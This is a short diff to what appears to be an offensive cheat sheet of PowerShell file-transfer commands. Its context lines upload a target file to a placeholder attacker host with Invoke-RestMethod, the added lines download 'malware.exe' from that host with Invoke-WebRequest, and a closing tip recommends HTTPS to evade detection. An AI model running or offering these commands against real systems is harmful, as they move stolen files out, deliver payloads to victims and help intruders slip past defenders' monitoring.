@@ -80,6 +80,10 @@
 
 	Invoke-RestMethod -Uri http://ATTACK_IP:PORT/REMOTE_FILE -Method PUT -InFile TARGET_FILE
 
+### 8) Invoke-WebRequest
+
+	powershell.exe iwr -uri ATTACK_IP/malware.exe -o C:\temp\malware.exe
+
 # TIPS AND TRICKS
 
 ### 1) If possible use SSL on attacking machine and use HTTPS to further evade detection
